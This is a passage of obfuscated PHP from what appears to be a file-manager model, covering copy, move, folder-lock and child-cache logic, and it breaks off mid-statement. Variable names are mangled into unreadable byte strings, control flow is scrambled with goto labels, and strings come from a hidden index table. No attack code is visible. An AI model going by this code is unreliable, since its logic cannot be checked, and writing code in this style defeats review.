$this->_lockKey($eÚ°í‰Ä, 0); goto bÊ™Ù¾; fİ¤ç÷Èİ§: $this->_lockTimeStart[$eÚ°í‰Ä] = timeFloat(); if (!is_array($D©÷™ŠÆİ)) { return; } $CœÉÏŒëßŠ = LNG($A†À‚šÜãÍ[535]); goto C¡¤ĞµÖ¢; bÊ™Ù¾: $B‹°˜Êô = array_reverse($this->parentLevelArray($D©÷™ŠÆİ[$A†À‚šÜãÍ[496]])); foreach ($B‹°˜Êô as $Eì¨ãõÓæ³) { $eÚ°í‰Ä = $D­¦™İ®»‚ . $A†À‚šÜãÍ[536] . $Eì¨ãõÓæ³; if (CacheLock::lockGet($A†À‚šÜãÍ[537] . $eÚ°í‰Ä)) { $D©÷™ŠÆİ = $this->sourceInfo($Eì¨ãõÓæ³); CacheLock::setErrorMsg($A†À‚šÜãÍ[160] . htmlspecialchars($D©÷™ŠÆİ[$A†À‚šÜãÍ[28]]) . $A†À‚šÜãÍ[513] . $CœÉÏŒëßŠ); $this->_lockKey($eÚ°í‰Ä, 1); $this->_lockKey($eÚ°í‰Ä, 0); } } goto e· Î¤ ™; e· Î¤ ™: } private function _lockCheckEnd($eõğâŠŞ“í, $cØÓãï¯Èµ) { goto A÷ÏÊğˆ; A÷ÏÊğˆ: $DîŞ” »« =& $_SERVER[«¾°Ã¤]; $A¡å—Ø¼æó = $eõğâŠŞ“í . $DîŞ” »«[95] . $cØÓãï¯Èµ; CacheLock::setErrorMsg($DîŞ” »«[375]); goto BÌ±¿ÖŒ‹Í; C†µ‹±²‡›: if ($F——¥ÖÈçÖ > 0.5) { unset(self::$cacheSourceInfo[$DîŞ” »«[447] . $cØÓãï¯Èµ]); } $A¿¿¶ÒˆÇ = $this->sourceInfo($cØÓãï¯Èµ); if (!$A¿¿¶ÒˆÇ) { show_json(LNG($DîŞ” »«[105]), !1); } goto C™Üæ¦Ãê‹; BÌ±¿ÖŒ‹Í: if (!isset($this->_lockTimeStart[$A¡å—Ø¼æó])) { return; } $F——¥ÖÈçÖ = timeFloat() - $this->_lockTimeStart[$A¡å—Ø¼æó]; unset($this->_lockTimeStart[$A¡å—Ø¼æó]); goto C†µ‹±²‡›; C™Üæ¦Ãê‹: } private function _lockParent($fŒŸùÊ¢­, $aÅÂ£ôÌ†ö, $dëË¦‘»›ø) { if (!$this->autoLockSet) { return; } $EÁ®¹å­“‚ = $this->sourceInfo($fŒŸùÊ¢­); if (!is_array($EÁ®¹å­“‚)) { return; } $b®²éŒ™·İ = array_reverse($this->parentLevelArray($EÁ®¹å­“‚[$_SERVER[«¾°Ã¤][496]])); foreach ($b®²éŒ™·İ as $c§µ–†ßš ) { $this->_lockEvent($c§µ–†ßš , $aÅÂ£ôÌ†ö, $dëË¦‘»›ø); } } private function _lockEvent($bøÒ‘ŠÕĞ, $dÔ‰Ö¸³», $eŒöø‘ê) { $f¯ğÒ˜İ =& $_SERVER[«¾°Ã¤]; if (!$this->autoLockSet) { return; } foreach ($dÔ‰Ö¸³» as $BïÔİ‹®ù) { $a±Í†¡‘ÂÌ = $BïÔİ‹®ù . $f¯ğÒ˜İ[95] . $bøÒ‘ŠÕĞ; if ($eŒöø‘ê && CacheLock::lockGet($f¯ğÒ˜İ[537] . $a±Í†¡‘ÂÌ)) { continue; } $this->_lockKey($a±Í†¡‘ÂÌ, $eŒöø‘ê); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($F„ö±®ğ, $D¥‚ĞêÁ† = 1) { $C¶ãéâ˜Ä¾ = $_SERVER[«¾°Ã¤][537] . md5($F„ö±®ğ); if ($D¥‚ĞêÁ†) { if (isset(self::$_lockItemArr[$C¶ãéâ˜Ä¾])) { return; } self::$_lockItemArr[$C¶ãéâ˜Ä¾] = 1; CacheLock::lock($C¶ãéâ˜Ä¾, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$C¶ãéâ˜Ä¾])) { return; } unset(self::$_lockItemArr[$C¶ãéâ˜Ä¾]); CacheLock::unlock($C¶ãéâ˜Ä¾); } } public function isParentOf($cÔğª½ê¯‹, $bâ¡Ü’øù) { goto B…«ÁÇôö; cÓëã†É§Î: $f×‘¹çô¯Ñ = $d¬–›ìÂ÷•[$C—¹‰Ñ­âõ[496]] . $d¬–›ìÂ÷•[$C—¹‰Ñ­âõ[404]] . $C—¹‰Ñ­âõ[47]; $d‰É½ãìÈƒ = $CÖ¥ˆ³Á¹¥[$C—¹‰Ñ­âõ[496]] . $CÖ¥ˆ³Á¹¥[$C—¹‰Ñ­âõ[404]] . $C—¹‰Ñ­âõ[47]; $D¬Ó‡ù˜¢ñ = strpos($d‰É½ãìÈƒ, $f×‘¹çô¯Ñ) === 0; goto c©ÇóË¹; B…«ÁÇôö: $C—¹‰Ñ­âõ =& $_SERVER[«¾°Ã¤]; $d¬–›ìÂ÷• = $this->sourceInfo($cÔğª½ê¯‹); $CÖ¥ˆ³Á¹¥ = $this->sourceInfo($bâ¡Ü’øù); goto cÓëã†É§Î; c©ÇóË¹: return $D¬Ó‡ù˜¢ñ; goto b¶°º‚àæÛ; b¶°º‚àæÛ: } private $targetIsDelete = 0; public function copy($C„Éñàğºì, $D¼ğÒãå³ª, $A™†«‚  Í = REPEAT_REPLACE, $Fğ¼ÌÂŠäï = '') { goto eœƒÔÑäø„; f×˜ÒØĞÀ: $this->updateModifyTime($D¼ğÒãå³ª); return $eÕÈ«ëÄ‹Ú; goto C›º¸¾«™; F†™»˜´ë‚: if ($F¼ñİŒš[$C½÷£ˆğ±ì[412]] == $C½÷£ˆğ±ì[87] && $bõÚâ˜Õ…ë == $eÕÈ«ëÄ‹Ú) { $this->folderSizeResetChildren($bõÚâ˜Õ…ë); } Model($C½÷£ˆğ±ì[541])->addAll($EíÍ‘µâ[$C½÷£ˆğ±ì[539]], array(), !0); if ($bõÚâ˜Õ…ë != $eÕÈ«ëÄ‹Ú || $F¼ñİŒš[$C½÷£ˆğ±ì[412]] == $C½÷£ˆğ±ì[87]) { Model($C½÷£ˆğ±ì[542])->eventCopy($eÕÈ«ëÄ‹Ú); } goto dß‡Ô©·Š; b¨‚ùÅí†: $this->_childrenListClear(); $this->lockCopyEnd($C„Éñàğºì); $this->lockWriteEnd($D¼ğÒãå³ª, $a’·ğÃ„Œã); goto F†™»˜´ë‚; bùèğÃ¢Æğ: if (!$F¼ñİŒš || !$DºóÃ‚É… || $DºóÃ‚É…[$C½÷£ˆğ±ì[412]] != $C½÷£ˆğ±ì[87]) { return !1; } if ($this->isParentOf($C„Éñàğºì, $D¼ğÒãå³ª)) { return !1; } $a’·ğÃ„Œã = $Fğ¼ÌÂŠäï ? $Fğ¼ÌÂŠäï : $F¼ñİŒš[$C½÷£ˆğ±ì[28]]; goto BõÌî×¨„; eœƒÔÑäø„: $C½÷£ˆğ±ì =& $_SERVER[«¾°Ã¤]; $F¼ñİŒš = $this->sourceInfo($C„Éñàğºì); $DºóÃ‚É… = $this->sourceInfo($D¼ğÒãå³ª); goto bùèğÃ¢Æğ; BõÌî×¨„: $this->lockCopyStart($C„Éñàğºì); $this->lockWriteStart($D¼ğÒãå³ª, $a’·ğÃ„Œã); $EíÍ‘µâ = array($C½÷£ˆğ±ì[538] => array(), $C½÷£ˆğ±ì[539] => array(), $C½÷£ˆğ±ì[540] => array()); goto c·™â°°Š; c·™â°°Š: $this->targetIsDelete = intval($F¼ñİŒš[$C½÷£ˆğ±ì[432]]); $bõÚâ˜Õ…ë = $this->fileNameExistCache($D¼ğÒãå³ª, $F¼ñİŒš[$C½÷£ˆğ±ì[28]]); $eÕÈ«ëÄ‹Ú = $this->_copy($C„Éñàğºì, $D¼ğÒãå³ª, $A™†«‚  Í, $EíÍ‘µâ, !0, $Fğ¼ÌÂŠäï); goto b¨‚ùÅí†; dß‡Ô©·Š: $this->saveAll($EíÍ‘µâ[$C½÷£ˆğ±ì[540]]); Model($C½÷£ˆğ±ì[193])->linkAdd($EíÍ‘µâ[$C½÷£ˆğ±ì[538]]); $this->folderSizeReset($D¼ğÒãå³ª); goto f×˜ÒØĞÀ; C›º¸¾«™: } private function _copy($DÈĞ‰Œ¦Û, $fÓ¬¨”–±, $b’òµÉ™¹, &$AÙ±öÎåçí, $eğáÃÏ÷­, $FÃ²ù¯ùÂÎ = '') { goto CäÂî‘¤Ã²; CäÂî‘¤Ã²: $f£æÍ·Â”¥ =& $_SERVER[«¾°Ã¤]; $Fñ²–Ğ‚‰ = $this->sourceInfoCache($DÈĞ‰Œ¦Û); $b¶³Ùñòßõ = $Fñ²–Ğ‚‰[$f£æÍ·Â”¥[412]] == $f£æÍ·Â”¥[87]; goto Bˆš©ó×±Í; Bˆš©ó×±Í: $E¥àÎÍ›åñ = $FÃ²ù¯ùÂÎ ? $FÃ²ù¯ùÂÎ : $Fñ²–Ğ‚‰[$f£æÍ·Â”¥[28]]; $Fƒè‚Êˆ‚Å = $this->fileNameExistCache($fÓ¬¨”–±, $E¥àÎÍ›åñ); if ($eğáÃÏ÷­) { $this->_childrenAllMake($DÈĞ‰Œ¦Û); if ($b¶³Ùñòßõ && $Fƒè‚Êˆ‚Å) { $this->_childrenAllMake($Fƒè‚Êˆ‚Å); } } goto f¿Ÿ²±çª; Fœîå×«…á: return $bŸÖæ«¤; goto aÚ±«ß¨ù; f¿Ÿ²±çª: if (!$Fƒè‚Êˆ‚Å) { return $this->_copyCreate($DÈĞ‰Œ¦Û, $fÓ¬¨”–±, $E¥àÎÍ›åñ, $AÙ±öÎåçí); } $bŸÖæ«¤ = $Fƒè‚Êˆ‚Å; if ($b¶³Ùñòßõ) { if ($b’òµÉ™¹ == REPEAT_RENAME_FOLDER) { $E¥àÎÍ›åñ = $this->fileNameAutoCache($fÓ¬¨”–±, $E¥àÎÍ›åñ, $b’òµÉ™¹, $b¶³Ùñòßõ); $bŸÖæ«¤ = $this->_copyCreate($DÈĞ‰Œ¦Û, $fÓ¬¨”–±, $E¥àÎÍ›åñ, $AÙ±öÎåçí); } else { $BâìÊ = $this->_childrenList($DÈĞ‰Œ¦Û); foreach ($BâìÊ as $FÈ‘ÍİÆ’Í) { $this->_copy($FÈ‘ÍİÆ’Í[$f£æÍ·Â”¥[404]], $Fƒè‚Êˆ‚Å, $b’òµÉ™¹, $AÙ±öÎåçí, !1); } } } else { if ($b’òµÉ™¹ == REPEAT_RENAME || $b’òµÉ™¹ == REPEAT_RENAME_FOLDER) { $E¥àÎÍ›åñ = $this->fileNameAutoCache($fÓ¬¨”–±, $E¥àÎÍ›åñ, $b’òµÉ™¹, $b¶³Ùñòßõ); $bŸÖæ«¤ = $this->_copyCreate($DÈĞ‰Œ¦Û, $fÓ¬¨”–±, $E¥àÎÍ›åñ, $AÙ±öÎåçí); } else { if ($b’òµÉ™¹ == REPEAT_REPLACE) { $D…áÌ•œÁ = $this->sourceInfoCache($Fƒè‚Êˆ‚Å); $F£êª¶”º÷ = $this->fileHistory($D…áÌ•œÁ, $Fñ²–Ğ‚‰[$f£æÍ·Â”¥[456]], $Fñ²–Ğ‚‰[$f£æÍ·Â”¥[78]]); if ($F£êª¶”º÷) { $AÙ±öÎåçí[$f£æÍ·Â”¥[538]][] = $Fñ²–Ğ‚‰[$f£æÍ·Â”¥[456]]; } } else { if ($b’òµÉ™¹ == REPEAT_SKIP) { } } } Hook::trigger($f£æÍ·Â”¥[543], array($f£æÍ·Â”¥[544], $Fñ²–Ğ‚‰, 0)); } goto Fœîå×«…á; aÚ±«ß¨ù: } private function _copyCreate($eó¸¾Ò®, $d¬ˆáçˆ¸», $b‘õĞÍï»É, &$e³•—Ù¾Ù) { goto eó‘êˆŒ…; b¸ç›Æ¿‚: $this->_childrenListAll($eó¸¾Ò®, $D„•Š’‚äĞ); $c××Õ³îïÜ = count($D„•Š’‚äĞ); if ($c××Õ³îïÜ == 0) { return $DØñâ¥×³±; } goto dªÏíòõÊë; dËÄ„ªÓÜÈ: $E—‚ÊğäÑ¸[$eó¸¾Ò®] = $DØñâ¥×³±; $bÙñÌÚóÍ† = array(); $CåæÛ´­¾Ô = array(); goto B˜ò¦ÁçÆ; eµé¶„º…¾: if ($A°‚ÉÂ™Ô†[$E’Ú°Ô‹šô[412]] != $E’Ú°Ô‹šô[87]) { $e³•—Ù¾Ù[$E’Ú°Ô‹šô[538]][] = $A°‚ÉÂ™Ô†[$E’Ú°Ô‹šô[456]]; return $DØñâ¥×³±; } $D„•Š’‚äĞ = array(); $dÌƒÀÄˆº = array(); goto b¸ç›Æ¿‚; dªÏíòõÊë: $dŠæ–â¾•Ô = $this->sourceInfo($DØñâ¥×³±); foreach ($D„•Š’‚äĞ as $CÄçÊ¾½ï) { $C¾ë‹ò¿ôë = $this->_makeItemData($CÄçÊ¾½ï, $dŠæ–â¾•Ô, $CÄçÊ¾½ï[$E’Ú°Ô‹šô[28]]); $C¾ë‹ò¿ôë[$E’Ú°Ô‹šô[496]] = $CÄçÊ¾½ï[$E’Ú°Ô‹šô[496]]; $dÌƒÀÄˆº[] = $C¾ë‹ò¿ôë; } $this->chunkEventSet($E’Ú°Ô‹šô[548], array($E’Ú°Ô‹šô[549], $e„àñö”äÎ, $c××Õ³îïÜ)); goto Dò°Êƒ×©; EËÂôİùÍ : $this->chunkEventSet($E’Ú°Ô‹šô[552], array($E’Ú°Ô‹šô[553], $e„àñö”äÎ, $c××Õ³îïÜ)); $this->saveAll($CåæÛ´­¾Ô); return $DØñâ¥×³±; goto CÇßÓÆƒÃœ; B˜ò¦ÁçÆ: foreach ($bÇ´³ìŠ as $CÄçÊ¾½ï) { $FªÓäŠ¸²İ = $CÄçÊ¾½ï[$E’Ú°Ô‹šô[404]]; $Eİ¿æ¢“–è = $this->_childrenMatch($E—‚ÊğäÑ¸, $CÄçÊ¾½ï, $dŠæ–â¾•Ô); $bÙñÌÚóÍ†[] = array($E’Ú°Ô‹šô[404], $FªÓäŠ¸²İ, $E’Ú°Ô‹šô[487], $Eİ¿æ¢“–è[$E’Ú°Ô‹šô[487]]); $CåæÛ´­¾Ô[] = array($E’Ú°Ô‹šô[404], $FªÓäŠ¸²İ, $E’Ú°Ô‹šô[496], $Eİ¿æ¢“–è[$E’Ú°Ô‹šô[496]]); $this->_copyApplyMeta($CÄçÊ¾½ï, $e³•—Ù¾Ù); if ($CÄçÊ¾½ï[$E’Ú°Ô‹šô[412]] != $E’Ú°Ô‹šô[87]) { $e³•—Ù¾Ù[$E’Ú°Ô‹šô[538]][] = $CÄçÊ¾½ï[$E’Ú°Ô‹šô[456]]; } } $this->chunkEventSet($E’Ú°Ô‹šô[550], array($E’Ú°Ô‹šô[551], $e„àñö”äÎ, $c××Õ³îïÜ)); $this->saveAll($bÙñÌÚóÍ†); goto EËÂôİùÍ ; AŞ±Ë¡©: $e„àñö”äÎ = $this->_makeItemData($A°‚ÉÂ™Ô†, $bœğ¶ÔÍŞ”, $b‘õĞÍï»É); Hook::trigger($E’Ú°Ô‹šô[545], $e„àñö”äÎ); Hook::trigger($E’Ú°Ô‹šô[546], array($E’Ú°Ô‹šô[547], $e„àñö”äÎ, 0)); goto C§—‡ˆ•ê; C§—‡ˆ•ê: $DØñâ¥×³± = $this->add($e„àñö”äÎ); $F¡¿ø¥Çø´ = array($E’Ú°Ô‹šô[404] => $DØñâ¥×³±, $E’Ú°Ô‹šô[28] => $b‘õĞÍï»É); $this->_copyApplyMeta($F¡¿ø¥Çø´, $e³•—Ù¾Ù); goto eµé¶„º…¾; eó‘êˆŒ…: $E’Ú°Ô‹šô =& $_SERVER[«¾°Ã¤]; $A°‚ÉÂ™Ô† = $this->sourceInfoCache($eó¸¾Ò®); $bœğ¶ÔÍŞ” = $this->sourceInfoCache($d¬ˆáçˆ¸»); goto AŞ±Ë¡©; Dò°Êƒ×©: $this->addAll($dÌƒÀÄˆº, array(), !1); $bÇ´³ìŠ = $this->where(array($E’Ú°Ô‹šô[487] => $DØñâ¥×³±))->select(); $E—‚ÊğäÑ¸ = $this->_childrenMakeRelation($D„•Š’‚äĞ, $bÇ´³ìŠ); goto dËÄ„ªÓÜÈ; CÇßÓÆƒÃœ: } private function _childrenMakeRelation($dÓÑŠù¥íô, $Eß‡Ê’Åø‘) { $dïæ†ÃÒ =& $_SERVER[«¾°Ã¤]; $D‰Æ‘À‰Î¬ = array(); $fÀê¨è±Ùæ = array(); foreach ($dÓÑŠù¥íô as $D¯‚¾–ÎÙÅ) { $A¾™²¾‹ßé = $D¯‚¾–ÎÙÅ[$dïæ†ÃÒ[28]] . $dïæ†ÃÒ[8] . $D¯‚¾–ÎÙÅ[$dïæ†ÃÒ[496]]; $D‰Æ‘À‰Î¬[$A¾™²¾‹ßé] = $D¯‚¾–ÎÙÅ[$dïæ†ÃÒ[404]]; } foreach ($Eß‡Ê’Åø‘ as $D¯‚¾–ÎÙÅ) { $A¾™²¾‹ßé = $D¯‚¾–ÎÙÅ[$dïæ†ÃÒ[28]] . $dïæ†ÃÒ[8] . $D¯‚¾–ÎÙÅ[$dïæ†ÃÒ[496]]; $Fôìí…ˆºğ = $D‰Æ‘À‰Î¬[$A¾™²¾‹ßé]; $fÀê¨è±Ùæ[$Fôìí…ˆºğ] = $D¯‚¾–ÎÙÅ[$dïæ†ÃÒ[404]]; } return $fÀê¨è±Ùæ; } private function _childrenMatch($Dºå­àÃÙˆ, $cÃõ™ºğã², $A ¢ÎÚöõ) { goto a÷÷×ˆÒæó; BÂ¬ŞáŒ©: $b»ˆ²¢Ë“â = $E¾È¦—ïªĞ[count($E¾È¦—ïªĞ) - 1]; return array($d´÷Ùæö­Ê[487] => $b»ˆ²¢Ë“â, $d´÷Ùæö­Ê[496] => $C£Öå§¯ÓĞ); goto fÉ–«º°; a÷÷×ˆÒæó: $d´÷Ùæö­Ê =& $_SERVER[«¾°Ã¤]; $C£Öå§¯ÓĞ = $A ¢ÎÚöõ[$d´÷Ùæö­Ê[496]]; $A “Äš¦¼ù = $this->parentLevelArray($cÃõ™ºğã²[$d´÷Ùæö­Ê[496]]); goto FÍ¿­§Ûõ; FÍ¿­§Ûõ: foreach ($A “Äš¦¼ù as $e–Éë¥‹‹) { if (isset($Dºå­àÃÙˆ[$e–Éë¥‹‹])) { $C£Öå§¯ÓĞ .= $Dºå­àÃÙˆ[$e–Éë¥‹‹] . $d´÷Ùæö­Ê[554]; } } $C£Öå§¯ÓĞ = rtrim($C£Öå§¯ÓĞ, $d´÷Ùæö­Ê[47]) . $d´÷Ùæö­Ê[47]; $E¾È¦—ïªĞ = $this->parentLevelArray($C£Öå§¯ÓĞ); goto BÂ¬ŞáŒ©; fÉ–«º°: } private function _makeItemData($fÛôÏØÈ, $CÙ‹‚éˆ¸¹, $Cî×Çªª¢ç) { $BÓí¸´Ù†ˆ =& $_SERVER[«¾°Ã¤]; $aï°ò¥Š®¢ = array($BÓí¸´Ù†ˆ[555] => $fÛôÏØÈ[$BÓí¸´Ù†ˆ[412]], $BÓí¸´Ù†ˆ[422] => $Cî×Çªª¢ç, $BÓí¸´Ù†ˆ[556] => $fÛôÏØÈ[$BÓí¸´Ù†ˆ[414]], $BÓí¸´Ù†ˆ[457] => $fÛôÏØÈ[$BÓí¸´Ù†ˆ[456]], $BÓí¸´Ù†ˆ[557] => $fÛôÏØÈ[$BÓí¸´Ù†ˆ[78]], $BÓí¸´Ù†ˆ[558] => $CÙ‹‚éˆ¸¹[$BÓí¸´Ù†ˆ[413]], $BÓí¸´Ù†ˆ[559] => $CÙ‹‚éˆ¸¹[$BÓí¸´Ù†ˆ[493]], $BÓí¸´Ù†ˆ[560] => USER_ID, $BÓí¸´Ù†ˆ[561] => USER_ID, $BÓí¸´Ù†ˆ[403] => $CÙ‹‚éˆ¸¹[$BÓí¸´Ù†ˆ[404]], $BÓí¸´Ù†ˆ[562] => $CÙ‹‚éˆ¸¹[$BÓí¸´Ù†ˆ[496]] . $CÙ‹‚éˆ¸¹[$BÓí¸´Ù†ˆ[404]] . $BÓí¸´Ù†ˆ[47], $BÓí¸´Ù†ˆ[426] => $fÛôÏØÈ[$BÓí¸´Ù†ˆ[84]], $BÓí¸´Ù†ˆ[431] => 0, $BÓí¸´Ù†ˆ[563] => $BÓí¸´Ù†ˆ[33]); return $aï°ò¥Š®¢; } private function _copyApplyMeta($Bğì“ìê‹½, &$bÜèÀ“ä”) { $EØÖ»Ú’ë‡ =& $_SERVER[«¾°Ã¤]; $Cğø‹ö‘ÍÒ = $Bğì“ìê‹½[$EØÖ»Ú’ë‡[404]]; $c»‰õÂ©¤ğ = $Bğì“ìê‹½[$EØÖ»Ú’ë‡[28]]; if (!isset($Bğì“ìê‹½[$EØÖ»Ú’ë‡[564]]) || !$Bğì“ìê‹½[$EØÖ»Ú’ë‡[564]] || $Bğì“ìê‹½[$EØÖ»Ú’ë‡[564]] == $EØÖ»Ú’ë‡[191]) { $bÜèÀ“ä”[$EØÖ»Ú’ë‡[540]][] = array($EØÖ»Ú’ë‡[404], $Cğø‹ö‘ÍÒ, $EØÖ»Ú’ë‡[564], short_id($Cğø‹ö‘ÍÒ)); } if (Input::check($c»‰õÂ©¤ğ, $EØÖ»Ú’ë‡[565])) { $bÜèÀ“ä”[$EØÖ»Ú’ë‡[539]][] = array($EØÖ»Ú’ë‡[404] => $Cğø‹ö‘ÍÒ, $EØÖ»Ú’ë‡[93] => $EØÖ»Ú’ë‡[453], $EØÖ»Ú’ë‡[372] => str_replace($EØÖ»Ú’ë‡[50], $EØÖ»Ú’ë‡[33], Pinyin::encode($c»‰õÂ©¤ğ))); $bÜèÀ“ä”[$EØÖ»Ú’ë‡[539]][] = array($EØÖ»Ú’ë‡[404] => $Cğø‹ö‘ÍÒ, $EØÖ»Ú’ë‡[93] => $EØÖ»Ú’ë‡[452], $EØÖ»Ú’ë‡[372] => Pinyin::encode($c»‰õÂ©¤ğ, $EØÖ»Ú’ë‡[566])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($FÍÀŞã„Œ÷) { goto FåÃ—„ö; FåÃ—„ö: $Dá¨ÄîŒÈ =& $_SERVER[«¾°Ã¤]; $aóÚì‘¡æä = $this->sourceInfo($FÍÀŞã„Œ÷); $EŠºÔ¬êÁ£ = $Dá¨ÄîŒÈ[433]; goto b¦Ûæ¡Œš¹; c–Æ¢Èåïâ: $f„¶ªöœöÖ = array_to_keyvalue($f„¶ªöœöÖ, $Dá¨ÄîŒÈ[404]); foreach ($f„¶ªöœöÖ as $C‹ÒÚ¢±Àá) { $AŠãøáÊˆé = $C‹ÒÚ¢±Àá[$Dá¨ÄîŒÈ[487]]; $FÍÀŞã„Œ÷ = $C‹ÒÚ¢±Àá[$Dá¨ÄîŒÈ[404]]; if (!isset($this->_childrenListCache[$FÍÀŞã„Œ÷]) && $C‹ÒÚ¢±Àá[$Dá¨ÄîŒÈ[412]] == $Dá¨ÄîŒÈ[87]) { $this->_childrenListCache[$FÍÀŞã„Œ÷] = array(); } if (!isset($this->_childrenListCache[$AŠãøáÊˆé])) { $this->_childrenListCache[$AŠãøáÊˆé] = array(); } $this->_childrenListCache[$AŠãøáÊˆé][$FÍÀŞã„Œ÷] = $C‹ÒÚ¢±Àá; $this->_childrenItemCache[$FÍÀŞã„Œ÷] = $C‹ÒÚ¢±Àá; } goto Fóİ«´‰ª; b¦Ûæ¡Œš¹: $FÑÙ’ïé—ñ = array($Dá¨ÄîŒÈ[496] => array($Dá¨ÄîŒÈ[521], $aóÚì‘¡æä[$Dá¨ÄîŒÈ[496]] . $FÍÀŞã„Œ÷ . $Dá¨ÄîŒÈ[522]), $Dá¨ÄîŒÈ[432] => $this->targetIsDelete); $f„¶ªöœöÖ = $this->field($EŠºÔ¬êÁ£)->where($FÑÙ’ïé—ñ)->select(); if (!$f„¶ªöœöÖ) { return; } goto c–Æ¢Èåïâ; Fóİ«´‰ª: } private function _childrenListAll($a®Õ‚ßÊõö, &$aÚ…§æ¶‹Š) { $A•šŒŒ­ÕÅ =& $_SERVER[«¾°Ã¤]; if (!isset($this->_childrenListCache[$a®Õ‚ßÊõö])) { return; } $Bã£‘¬¼ì = $this->_childrenListCache[$a®Õ‚ßÊõö]; foreach ($Bã£‘¬¼ì as $AºÄÂŞŠÊ => $C¿ÛƒÅ©—­) { $aÚ…§æ¶‹Š[$AºÄÂŞŠÊ] = $C¿ÛƒÅ©—­; if ($C¿ÛƒÅ©—­[$A•šŒŒ­ÕÅ[412]] == $A•šŒŒ­ÕÅ[87]) { $this->_childrenListAll($AºÄÂŞŠÊ, $aÚ…§æ¶‹Š); } } } private function sourceInfoCache($E“°°Ğé©§) { if (isset($this->_childrenItemCache[$E“°°Ğé©§])) { return $this->_childrenItemCache[$E“°°Ğé©§]; } return $this->sourceInfo($E“°°Ğé©§); } private function _childrenList($AæĞğçÇ¸) { if (isset($this->_childrenListCache[$AæĞğçÇ¸])) { return $this->_childrenListCache[$AæĞğçÇ¸]; } return $this->_childrenListSelect($AæĞğçÇ¸); } private function _childrenListSelect($aË‡ªÛƒÉÍ) { goto FŒ¼‹ÎĞßÚ; Dˆêíğì”Â: foreach ($D¦¶¿ê¸İª as $aË‡ªÛƒÉÍ => $f·Ä‹–İÌŠ) { $this->_childrenItemCache[$aË‡ªÛƒÉÍ] = $f·Ä‹–İÌŠ; } return $D¦¶¿ê¸İª; goto BÇ—¥¹÷°Ñ; FŒ¼‹ÎĞßÚ: $FªÍÅåÄºÙ =& $_SERVER[«¾°Ã¤]; $eÅß‚½‚Ç™ = array($FªÍÅåÄºÙ[487] => $aË‡ªÛƒÉÍ, $FªÍÅåÄºÙ[432] => $this->targetIsDelete); $F²Œ›»Ó” = $this->where($eÅß‚½‚Ç™)->select(); goto cá¦ˆ¡é²¹; cá¦ˆ¡é²¹: $F²Œ›»Ó” = $F²Œ›»Ó” ? $F²Œ›»Ó” : array(); $D¦¶¿ê¸İª = array_to_keyvalue($F²Œ›»Ó”, $FªÍÅåÄºÙ[404]); $this->_childrenListCache[$aË‡ªÛƒÉÍ] = $D¦¶¿ê¸İª; goto Dˆêíğì”Â; BÇ—¥¹÷°Ñ: } private function fileNameExistCache($bØ‘ªæÁ, $aÉ„ÓÛÁ±) { $EÙ¢ã÷¡ì =& $_SERVER[«¾°Ã¤]; $aÉ„ÓÛÁ± = strtolower($aÉ„ÓÛÁ±); $B¦øÛÓåâë = $this->_childrenList($bØ‘ªæÁ); foreach ($B¦øÛÓåâë as $B¶Îğ‘Çâ) { if ($aÉ„ÓÛÁ± == strtolower($B¶Îğ‘Çâ[$EÙ¢ã÷¡ì[28]])) { return $B¶Îğ‘Çâ[$EÙ¢ã÷¡ì[404]]; } } return !1; } private function fileNameAutoCache($AãåºØß¸, $B²•™‹Ù÷, $DñˆŒó¸, $Eá‡‘µ†¦£) { $EçĞ®¨¬ÜÇ =& $_SERVER[«¾°Ã¤]; $d¦ÀÏ½áô’ = $this->_childrenList($AãåºØß¸); $e‡©Û×áåæ = array_to_keyvalue($d¦ÀÏ½áô’, $EçĞ®¨¬ÜÇ[33], $EçĞ®¨¬ÜÇ[28]); return $this->fileNameAutoGet($e‡©Û×áåæ, $B²•™‹Ù÷, $DñˆŒó¸, $Eá‡‘µ†¦£); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($c×£¸ô“ÄÊ, $fíÇÖ§·±¦, $a‘æ¡¿Á…å = REPEAT_REPLACE, $B‰£®òÀé = '') { goto bÑ¤õõ®Ù; C²ªÇ·Ÿ´ä: return $f±ê»ô—Â»; goto D©ƒ‹æ¹à«; AĞ‡´¯Ù´±: $this->folderSizeReset($fíÇÖ§·±¦); $C§¡ò’Ï¿ = array($cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[487]], $fíÇÖ§·±¦); if ($cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[412]] == $FÖ‘áÇ÷Õ[87]) { $C§¡ò’Ï¿[] = $c×£¸ô“ÄÊ; } goto bÚ‰Ëëó»å; bÚ‰Ëëó»å: $this->updateModifyTime($C§¡ò’Ï¿); Model($FÖ‘áÇ÷Õ[542])->eventMove($c×£¸ô“ÄÊ, $cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[487]], $fíÇÖ§·±¦); Hook::trigger($FÖ‘áÇ÷Õ[568], $EÏÔ¡Ç†ğ´); goto C²ªÇ·Ÿ´ä; döÛïğä·: if ($cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[412]] == $FÖ‘áÇ÷Õ[87] && $FÔ¬¥ŠªÃ™) { $this->folderSizeResetChildren($f±ê»ô—Â»); } Model($FÖ‘áÇ÷Õ[193])->linkAdd($cáĞİñÇ¦Ë[$FÖ‘áÇ÷Õ[538]]); if ($FÔ¬¥ŠªÃ™ && $cáĞİñÇ¦Ë[$FÖ‘áÇ÷Õ[569]]) { $this->removeNow($c×£¸ô“ÄÊ, !1); } goto bæ˜¶‡ìç; Dá®¬ß¨¨ö: if (!$cáš¬ÆÈí÷ || !$b¯ÓãŒÍäˆ || $b¯ÓãŒÍäˆ[$FÖ‘áÇ÷Õ[412]] != $FÖ‘áÇ÷Õ[87]) { return !1; } Hook::trigger($FÖ‘áÇ÷Õ[567], $EÏÔ¡Ç†ğ´); $this->targetIsDelete = intval($cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[432]]); goto d”İØÈÌáŠ; d”İØÈÌáŠ: if ($cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[487]] == $fíÇÖ§·±¦ && $B‰£®òÀé != $cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[28]]) { $eñ ©Í´ï¦ = $this->fileNameExist($fíÇÖ§·±¦, $B‰£®òÀé); if ($eñ ©Í´ï¦ && 